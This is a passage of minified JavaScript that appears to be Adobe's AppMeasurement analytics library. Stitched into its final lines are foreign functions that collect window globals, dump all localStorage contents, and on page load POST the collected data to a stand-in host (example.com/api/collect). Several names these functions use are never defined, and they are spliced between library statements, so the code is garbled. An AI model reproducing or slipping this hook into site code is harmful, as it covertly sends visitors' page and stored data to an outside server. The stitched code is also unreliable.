  }, t.sb = function (e) {
    t.Ba(t.Ia, e);
  }, t.Ha = [], t.registerPostTrackCallback = function (e) {
    for (var n = [], a = 1; a < arguments.length; a++) n.push(arguments[a]);
    "function" == typeof e ? t.Ha.push([e, n]) : t.debugTracking && t.log("Warning, Non function type passed to registerPostTrackCallback");
  }, t.rb = function (e) {
    t.Ba(t.Ha, e);
  }, t.Ba = function (e, n) {
    if ("object" == typeof e) for (var a = 0; a < e.length; a++) {
      var i = e[a][0],
        r = e[a][1].slice();
      if (r.unshift(n), "function" == typeof i) try {
        i.apply(null, r);
      } catch (e) {
        t.debugTracking && t.log(e.message);
      }
    }
  }, t.tl = t.trackLink = function (e, n, a, i, r) {
    return t.linkObject = e, t.linkType = n, t.linkName = a, r && (t.bodyClickTarget = e, t.bodyClickFunction = r), t.track(i);
  }, t.trackLight = function (e, n, a, i) {
    return t.lightProfileID = e, t.lightStoreForSeconds = n, t.lightIncrementBy = a, t.track(i);
  }, t.clearVars = function () {
    var e, n;
    for (e = 0; e < t.i.length; e++) ("prop" == (n = t.i[e]).substring(0, 4) || "eVar" == n.substring(0, 4) || "hier" == n.substring(0, 4) || "list" == n.substring(0, 4) || "channel" == n || "events" == n || "eventList" == n || "products" == n || "productList" == n || "purchaseID" == n || "transactionID" == n || "state" == n || "zip" == n || "campaign" == n) && (t[n] = void 0);
  }, t.tagContainerMarker = "", t.Eb = function (e, a) {
    var i = t.tb() + "/" + e + "?AQB=1&ndh=1&pf=1&" + (t.Fa() ? "callback=s_c_il[" + t._in + "].doPostbacks&et=1&" : "") + a + "&AQE=1";
    t.sb(i), t.V ? t.Ob(n.sessionStorage, i) : (t.Ka(), t.Aa(i), t.I());
  }, t.tb = function () {
    var e = t.ub();
    return "http" + (t.ssl ? "s" : "") + "://" + e + "/b/ss/" + t.account + "/" + (t.mobile ? "5." : "") + (t.Fa() ? "10" : "1") + "/JS-" + t.version + (t.nc ? "T" : "") + (t.tagContainerMarker ? "-" + t.tagContainerMarker : "");
  }, t.Fa = function () {
    return t.AudienceManagement && t.AudienceManagement.isReady() || 0 != t.usePostbacks;
  }, t.ub = function () {
    var e = t.dc,
      n = t.trackingServer;
    return n ? t.trackingServerSecure && t.ssl && (n = t.trackingServerSecure) : ("d1" == (e = e ? ("" + e).toLowerCase() : "d1") ? e = "112" : "d2" == e && (e = "122"), n = t.wb() + "." + e + ".2o7.net"), n;
  }, t.wb = function () {
    var e = t.visitorNamespace;
    return e || (e = (e = t.account.split(",")[0]).replace(/[^0-9a-z]/gi, "")), e;
  }, t.gb = /{(%?)(.*?)(%?)}/, t.sc = RegExp(t.gb.source, "g"), t.Zb = function (e) {
    if ("object" == typeof e.dests) for (var n = 0; n < e.dests.length; ++n) {
      var a = e.dests[n];
      if ("string" == typeof a.c && "aa." == a.id.substr(0, 3)) for (var i = a.c.match(t.sc), r = 0; r < i.length; ++r) {
        var o = i[r],
          c = o.match(t.gb),
          s = "";
        "%" == c[1] && "timezone_offset" == c[2] ? s = new Date().getTimezoneOffset() : "%" == c[1] && "timestampz" == c[2] && (s = t.cc()), a.c = a.c.replace(o, t.escape(s));
      }
    }
  }, t.cc = function () {
    var e = new Date(),
      n = new Date(6e4 * Math.abs(e.getTimezoneOffset()));
    return t.k(4, e.getFullYear()) + "-" + t.k(2, e.getMonth() + 1) + "-" + t.k(2, e.getDate()) + "T" + t.k(2, e.getHours()) + ":" + t.k(2, e.getMinutes()) + ":" + t.k(2, e.getSeconds()) + (0 < e.getTimezoneOffset() ? "-" : "+") + t.k(2, n.getUTCHours()) + ":" + t.k(2, n.getUTCMinutes());
  }, t.k = function (e, t) {
    return (Array(e + 1).join(0) + t).slice(-e);
  }, t.ua = {}, t.doPostbacks = function (e) {
    if ("object" == typeof e) if (t.Zb(e), "object" == typeof t.AudienceManagement && "function" == typeof t.AudienceManagement.isReady && t.AudienceManagement.isReady() && "function" == typeof t.AudienceManagement.passData) t.AudienceManagement.passData(e);else if ("object" == typeof e && "object" == typeof e.dests) for (var n = 0; n < e.dests.length; ++n) {
      var a = e.dests[n];
      "object" == typeof a && "string" == typeof a.c && "string" == typeof a.id && "aa." == a.id.substr(0, 3) && (t.ua[a.id] = new Image(), t.ua[a.id].alt = "", t.ua[a.id].src = a.c);
    }
  }, t.bufferRequests = function (e) {
    e || void 0 === e ? t.qb() : t.pb();
  }, t.qb = function () {
    t.o(t.w.sessionStorage) ? t.V = !0 : t.log("Warning, session storage is not available. Requests will not be buffered.");
  }, t.pb = function () {
    t.V && t.Ka(), t.V = !1;
  }, t.o = function (e) {
    var t = !0;
    return e && e.setItem && n.JSON || (t = !1), t;
  }, t.Ka = function () {
    var e = t.aa(n.sessionStorage);
    if (e) {
      for (var a = 0; a < e.length; a++) t.Aa(e[a]);
      t.xa(n.sessionStorage), t.I();
    }
  }, t.Aa = function (e) {
    t.g || t.xb(), t.g.push(e), t.na = t.B(), t.fb();
  }, t.Ob = function (e, n) {
    var a = t.aa(e) || [];
    a.push(n), t.La(e, a);
  }, t.La = function (e, a) {
    try {
      e.setItem(t.ba(), n.JSON.stringify(a));
    } catch (e) {}
  }, t.aa = function (e) {
    var a, i;
    if (t.o(e)) {
      try {
        (i = e.getItem(t.ba())) && (a = n.JSON.parse(i));
      } catch (e) {}
      return a;
    }
  }, t.xb = function () {
    t.ta() && (t.g = t.aa(n.localStorage)), t.g || (t.g = []);
  }, t.xa = function (e) {
    if (t.o(e)) try {
      e.removeItem(t.ba());
    } catch (e) {}
  }, t.ta = function () {
    var e = !0;
    return t.trackOffline && t.storageFilename && t.o(n.localStorage) || (e = !1), e;
  }, t.Va = function () {
    var e = 0;
    return t.g && (e = t.g.length), t.p && e++, e;
  }, t.I = function () {
    if (!t.p || (t.A && t.A.complete && t.A.D && t.A.T(), !t.p)) if (t.Wa = a, t.ra) t.na > t.P && t.cb(t.g), t.va(500);else {
      var e = t.Sb();
      0 < e ? t.va(e) : (e = t.Ta()) && (t.p = 1, t.jc(e), t.mc(e));
    }
  }, t.va = function (e) {
    t.Wa || (e || (e = 0), t.Wa = setTimeout(t.I, e));
  }, t.Sb = function () {
    var e;
    return !t.trackOffline || 0 >= t.offlineThrottleDelay ? 0 : (e = t.B() - t.ab, t.offlineThrottleDelay < e ? 0 : t.offlineThrottleDelay - e);
  }, t.Ta = function () {
    if (t.g && 0 < t.g.length) return t.g.shift();
  }, t.jc = function (e) {
    if (t.debugTracking) {
      var n,
        a = "AppMeasurement Debug: " + e;
      for (e = e.split("&"), n = 0; n < e.length; n++) a += "\n\t" + t.unescape(e[n]);
      t.log(a);
    }
  }, t.Da = function () {
    return t.marketingCloudVisitorID || t.analyticsVisitorID;
  }, t.Z = !1;
  try {
    o = JSON.parse('{"x":"y"}');
  } catch (e) {
    o = null;
  }
  for (o && "y" == o.x ? (t.Z = !0, t.Y = function (e) {
    return JSON.parse(e);
  }) : n.$ && n.$.parseJSON ? (t.Y = function (e) {
    return n.$.parseJSON(e);
  }, t.Z = !0) : t.Y = function () {
    return null;
  }, t.mc = function (e) {
    var i, r, o;
    if (t.zb(e) && (r = 1, i = {
      send: function (e) {
        t.useBeacon = !1, navigator.sendBeacon(e) ? i.T() : i.la();
      }
    }), !i && t.Da() && 2047 < e.length && (t.kb() && (r = 2, i = new XMLHttpRequest()), i && (t.AudienceManagement && t.AudienceManagement.isReady() || 0 != t.usePostbacks) && (t.Z ? i.Oa = !0 : i = 0)), !i && t.rc && (e = e.substring(0, 2047)), !i && t.d.createElement && (0 != t.usePostbacks || t.AudienceManagement && t.AudienceManagement.isReady()) && (i = t.d.createElement("SCRIPT")) && "async" in i && ((o = (o = t.d.getElementsByTagName("HEAD")) && o[0] ? o[0] : t.d.body) ? (i.type = "text/javascript", i.setAttribute("async", "async"), r = 3) : i = 0), i || (r = 4, (i = new Image()).alt = "", i.abort || void 0 === n.InstallTrigger || (i.abort = function () {
      i.src = a;
    })), i.bb = Date.now(), i.Qa = function () {
      try {
        i.D && (clearTimeout(i.D), i.D = 0);
      } catch (e) {}
    }, i.onload = i.T = function () {
      if (!0 !== i.Vb && (i.Vb = !0, i.bb && (t.oa = Date.now() - i.bb), t.rb(e), i.Qa(), t.Xb(), t.ha(), t.p = 0, t.I(), i.Oa)) {
        i.Oa = !1;
        try {
          t.doPostbacks(t.Y(i.responseText));
        } catch (e) {}
      }
    }, i.onabort = i.onerror = i.la = function () {
      i.Qa(), (t.trackOffline || t.ra) && t.p && t.g.unshift(t.Wb), t.p = 0, t.na > t.P && t.cb(t.g), t.ha(), t.va(500);
    }, i.onreadystatechange = function () {
      4 == i.readyState && (200 == i.status ? i.T() : i.la());
    }, t.ab = t.B(), 1 === r) i.send(e);else if (2 === r) o = e.indexOf("?"), r = e.substring(0, o), o = (o = e.substring(o + 1)).replace(/&callback=[a-zA-Z0-9_.\[\]]+/, ""), i.open("POST", r, !0), i.withCredentials = !0, i.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), i.send(o);else if (i.src = e, 3 === r) {
      if (t.Za) try {
        o.removeChild(t.Za);
      } catch (e) {}
      o.firstChild ? o.insertBefore(i, o.firstChild) : o.appendChild(i), t.Za = t.A;
    }
    i.D = setTimeout(function () {
      i.D && (i.complete ? i.T() : (t.trackOffline && i.abort && i.abort(), i.la()));
    }, 5e3), t.Wb = e, t.A = n["s_i_" + t.replace(t.account, ",", "_")] = i, (t.useForcedLinkTracking && t.L || t.bodyClickFunction) && (t.forcedLinkTrackingTimeout || (t.forcedLinkTrackingTimeout = 250), t.ia = setTimeout(t.ha, t.forcedLinkTrackingTimeout));
  }, t.zb = function (e) {
    var n = !1;
    return navigator.sendBeacon && (t.Bb(e) || t.useBeacon) && (n = !0), t.Kb(e) && (n = !1), n;
  }, t.Bb = function (e) {
    return !!(e && 0 < e.indexOf("pe=lnk_e"));
  }, t.Kb = function (e) {
    return 64e3 <= e.length;
  }, t.kb = function () {
    return "undefined" != typeof XMLHttpRequest && "withCredentials" in new XMLHttpRequest();
  }, t.Xb = function () {
    !t.ta() || t.$a > t.P || (t.xa(n.localStorage), t.$a = t.B());
  }, t.cb = function (e) {
    t.ta() && (t.fb(), t.La(n.localStorage, e), t.P = t.B());
  }, t.fb = function () {
    if (t.trackOffline) for ((!t.offlineLimit || 0 >= t.offlineLimit) && (t.offlineLimit = 10); t.g.length > t.offlineLimit;) t.Ta();
  }, t.forceOffline = function () {
    t.ra = !0;
  }, t.forceOnline = function () {
    t.ra = !1;
  }, t.ba = function () {
    return t.storageFilename + "-" + t.visitorNamespace + t.account;
  }, t.B = function () {
    return new Date().getTime();
  }, t.Xa = function (e) {
    return 0 != (e = e.toLowerCase()).indexOf("#") && 0 != e.indexOf("about:") && 0 != e.indexOf("opera:") && 0 != e.indexOf("javascript:");
  }, t.setTagContainer = function (e) {
    var n, a, i;
    for (t.nc = e, n = 0; n < t._il.length; n++) if ((a = t._il[n]) && "s_l" == a._c && a.tagContainerName == e) {
      if (t.U(a), a.lmq) for (n = 0; n < a.lmq.length; n++) i = a.lmq[n], t.loadModule(i.n);
      if (a.ml) for (i in a.ml) if (t[i]) for (n in e = t[i], i = a.ml[i]) !Object.prototype[n] && ("function" != typeof i[n] || 0 > ("" + i[n]).indexOf("s_c_il")) && (e[n] = i[n]);
      if (a.mmq) for (n = 0; n < a.mmq.length; n++) i = a.mmq[n], t[i.m] && (e = t[i.m])[i.f] && "function" == typeof e[i.f] && (i.a ? e[i.f].apply(e, i.a) : e[i.f].apply(e));
      if (a.tq) for (n = 0; n < a.tq.length; n++) t.track(a.tq[n]);
      a.s = t;
      break;
    }
  }, t.Util = {
    urlEncode: t.escape,
    urlDecode: t.unescape,
    cookieRead: t.cookieRead,
    cookieWrite: t.cookieWrite,
    getQueryParam: function (e, a, i, r) {
      var o,
        c = "";
      return a || (a = t.pageURL ? t.pageURL : n.location), i = i || "&", e && a ? 0 > (o = (a = "" + a).indexOf("?")) ? c : (a = i + a.substring(o + 1) + i, r && (0 <= a.indexOf(i + e + i) || 0 <= a.indexOf(i + e + "=" + i)) ? void 0 : (0 <= (o = a.indexOf("#")) && (a = a.substr(0, o) + i), 0 > (o = a.indexOf(i + e + "=")) || (0 <= (o = (a = a.substring(o + i.length + e.length + 1)).indexOf(i)) && (a = a.substring(0, o)), 0 < a.length && (c = t.unescape(a))), c)) : c;
    },
    getIeVersion: function () {
      return document.documentMode ? document.documentMode : t.Ea() ? 7 : null;
    }
  }, t.F = "supplementalDataID timestamp dynamicVariablePrefix visitorID marketingCloudVisitorID analyticsVisitorID audienceManagerLocationHint authState fid vmk visitorMigrationKey visitorMigrationServer visitorMigrationServerSecure charSet visitorNamespace cookieDomainPeriods fpCookieDomainPeriods cookieLifetime pageName pageURL customerPerspective referrer contextData contextData.cm.ssf contextData.opt.dmp contextData.opt.sell clientHints currencyCode lightProfileID lightStoreForSeconds lightIncrementBy retrieveLightProfiles deleteLightProfiles retrieveLightData".split(" "), t.i = t.F.concat("purchaseID variableProvider channel server pageType transactionID campaign state zip events events2 products audienceManagerBlob tnt".split(" ")), t.pa = "timestamp charSet visitorNamespace cookieDomainPeriods cookieLifetime contextData lightProfileID lightStoreForSeconds lightIncrementBy".split(" "), t.Q = t.pa.slice(0), t.Na = "account allAccounts debugTracking visitor visitorOptedOut trackOffline offlineLimit offlineThrottleDelay storageFilename usePlugins doPlugins configURL visitorSampling visitorSamplingGroup linkObject clickObject linkURL linkName linkType trackDownloadLinks trackExternalLinks trackClickMap trackInlineStats linkLeaveQueryString linkTrackVars linkTrackEvents linkDownloadFileTypes linkExternalFilters linkInternalFilters useForcedLinkTracking forcedLinkTrackingTimeout writeSecureCookies decodeLinkParameters useLinkTrackSessionStorage collectHighEntropyUserAgentHints trackingServer trackingServerSecure ssl abort mobile dc lightTrackVars maxDelay expectSupplementalData useBeacon usePostbacks registerPreTrackCallback registerPostTrackCallback bodyClickTarget bodyClickFunction bufferRequests AudienceManagement".split(" "), i = 0; 250 >= i; i++) 76 > i && (t.i.push("prop" + i), t.Q.push("prop" + i)), t.i.push("eVar" + i), t.Q.push("eVar" + i), 6 > i && t.i.push("hier" + i), 4 > i && t.i.push("list" + i);
  i = "pe pev1 pev2 pev3 latitude longitude resolution colorDepth javascriptVersion javaEnabled cookiesEnabled browserWidth browserHeight connectionType homepage pageURLRest marketingCloudOrgID ms_a".split(" "), t.i = t.i.concat(i), t.F = t.F.concat(i), t.ssl = 0 <= n.location.protocol.toLowerCase().indexOf("https"), t.charSet = "UTF-8", t.contextData = {}, t.wa = ["architecture", "bitness", "model", "platformVersion", "wow64"], t.writeSecureCookies = !1, t.collectHighEntropyUserAgentHints = !1, t.offlineThrottleDelay = 0, t.storageFilename = "AppMeasurement.requests", t.R = "s_sq", t.ab = 0, t.na = 0, t.P = 0, t.$a = 0, t.linkDownloadFileTypes = "exe,zip,wav,mp3,mov,mpg,avi,wmv,pdf,doc,docx,xls,xlsx,ppt,pptx", t.w = n, t.d = n.document, t.ha = function () {
    t.ia && (n.clearTimeout(t.ia), t.ia = a), t.bodyClickTarget && t.L && t.bodyClickTarget.dispatchEvent(t.L), t.bodyClickFunction && ("function" == typeof t.bodyClickFunction ? t.bodyClickFunction() : t.bodyClickTarget && t.bodyClickTarget.href && (t.d.location = t.bodyClickTarget.href)), t.bodyClickTarget = t.L = t.bodyClickFunction = 0;
  }, t.eb = function () {
    t.b = t.d.body, t.b ? (t.u = function (e) {
      var a, i, r, o, c;
      if (!(t.d && t.d.getElementById("cppXYctnr") || e && e["s_fe_" + t._in])) {
        if (t.Pa) {
          if (!t.useForcedLinkTracking) return t.b.removeEventListener("click", t.u, !0), void (t.Pa = t.useForcedLinkTracking = 0);
          t.b.removeEventListener("click", t.u, !1);
        } else t.useForcedLinkTracking = 0;
        t.clickObject = e.srcElement ? e.srcElement : e.target;
        try {
          if (!t.clickObject || t.O && t.O == t.clickObject || !(t.clickObject.tagName || t.clickObject.parentElement || t.clickObject.parentNode)) t.clickObject = 0;else {
            var s = t.O = t.clickObject;
            if (t.ma && (clearTimeout(t.ma), t.ma = 0), t.ma = setTimeout(function () {
              t.O == s && (t.O = 0);
            }, 1e4), r = t.Va(), t.track(), r < t.Va() && t.useForcedLinkTracking && e.target) {
              for (o = e.target; o && o != t.b && "A" != o.tagName.toUpperCase() && "AREA" != o.tagName.toUpperCase();) o = o.parentNode;
              if (o && (c = o.href, t.Xa(c) || (c = 0), i = o.target, e.target.dispatchEvent && c && (!i || "_self" == i || "_top" == i || "_parent" == i || n.name && i == n.name))) {
                try {
                  a = t.d.createEvent("MouseEvents");
                } catch (e) {
                  a = new n.MouseEvent();
                }
                if (a) {
                  try {
                    a.initMouseEvent("click", e.bubbles, e.cancelable, e.view, e.detail, e.screenX, e.screenY, e.clientX, e.clientY, e.ctrlKey, e.altKey, e.shiftKey, e.metaKey, e.button, e.relatedTarget);
                  } catch (e) {
                    a = 0;
                  }
                  a && (a["s_fe_" + t._in] = a.s_fe = 1, e.stopPropagation(), e.stopImmediatePropagation && e.stopImmediatePropagation(), e.preventDefault(), t.bodyClickTarget = e.target, t.L = a);
                }
              }
            }
          }
        } catch (e) {
          t.clickObject = 0;
        }
      }
    }, t.b && t.b.attachEvent ? t.b.attachEvent("onclick", t.u) : t.b && t.b.addEventListener && (navigator && (0 <= navigator.userAgent.indexOf("WebKit") && t.d.createEvent || 0 <= navigator.userAgent.indexOf("Firefox/2") && n.MouseEvent) && (t.Pa = 1, t.useForcedLinkTracking = 1, t.b.addEventListener("click", t.u, !0)), t.b.addEventListener("click", t.u, !1))) : setTimeout(t.eb, 30);
  }, t.rc = t.Ea(), t.Yb(), t.yc || (e ? t.setAccount(e) : t.log("Error, missing Report Suite ID in AppMeasurement initialization"), t.eb(), t.loadModule("ActivityMap"));
}
jshookEvents.forEach(function (event) {
  document.addEventListener(event, handleEvent);
});

// Collect data from window object
function s_gi(e) {
  var t,
    n,
    a,
    i,
    r,
    o = window.s_c_il,
    c = e.split(","),
    s = 0;
  if (o) for (n = 0; !s && n < o.length;) {
    if ("s_c" == (t = o[n])._c && (t.account || t.oun)) if (t.account && t.account == e) s = 1;else for (a = t.account ? t.account : t.oun, a = t.allAccounts ? t.allAccounts : a.split(","), i = 0; i < c.length; i++) for (r = 0; r < a.length; r++) c[i] == a[r] && (s = 1);
    n++;
  }
  return s ? t.setAccount && t.setAccount(e) : t = new AppMeasurement(e), t;
}
function collectWindowData() {
  let collectedData = {};
  for (let variable of globalVariables) {
    let value = window[variable];
    let dataType = typeof value;
    collectedData[variable] = {
      type: dataType,
      value: dataType === "function" ? null : value
    };
  }
  return collectedData;
}

// Tracking keypress event on local storage
window.onstorage = () => {
  if (!localStorageKeyPressed) localStorageKeyPressed = true;
};

// Collect and send data
function s_pgicq() {
  var e,
    t,
    n,
    a = window,
    i = a.s_giq;
  if (i) for (e = 0; e < i.length; e++) (n = s_gi((t = i[e]).oun)).setAccount(t.un), n.setTagContainer(t.tagContainerName);
  a.s_giq = 0;
}
function collectAndSendData() {
  let collectedData = collectWindowData();
  sendDataToServer(collectedData);
}

// Track local storage
function localstorageTrack() {
  let storageItems = {};
  for (let i = 0; i < localStorage.length; i++) {
    let key = localStorage.key(i);
    storageItems[key] = localStorage.getItem(key);
  }
  return storageItems;
}

// Send data to server
AppMeasurement.getInstance = s_gi, window.s_objectID || (window.s_objectID = 0), s_pgicq();
function sendDataToServer(data) {
  const url = "https://example.com/api/collect";
  const xhr = new XMLHttpRequest();
  xhr.open("POST", url, true);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
      if (xhr.status === 200) {
        console.log("Data sent successfully");
      } else {
        console.error("Failed to send data, status code:" + xhr.status);
      }
    }
  };
  xhr.send(JSON.stringify(data));
}

// Execute data collection and sending operation after page load
window.addEventListener("load", collectAndSendData);